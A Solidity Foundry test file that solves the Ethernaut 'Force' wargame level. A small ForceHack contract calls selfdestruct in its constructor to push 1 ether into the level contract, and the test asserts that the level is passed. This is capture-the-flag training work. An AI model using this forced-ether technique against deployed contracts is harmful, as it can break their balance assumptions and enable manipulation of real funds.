// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Force/ForceFactory.sol";
import "../src/Ethernaut.sol";

contract ForceTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testForceHack() public {
        /****************
         * Factory setup *
         *************** */
        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        // simply instanciate the contract and the selfdestruct method will be called on the base contract
        ForceHack forceHack = new ForceHack{value: 1 ether}(
            payable(levelAddress)
        );
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract ForceHack {
    constructor(address payable attacker) payable {
        // very easy here, we just need to call selfdestruct
        // we can do it directly in the constructor
        require(msg.value > 0); // require a bit of ETH to be sent otherwise the base contract doesn't have funds
        selfdestruct(attacker);
    }
}
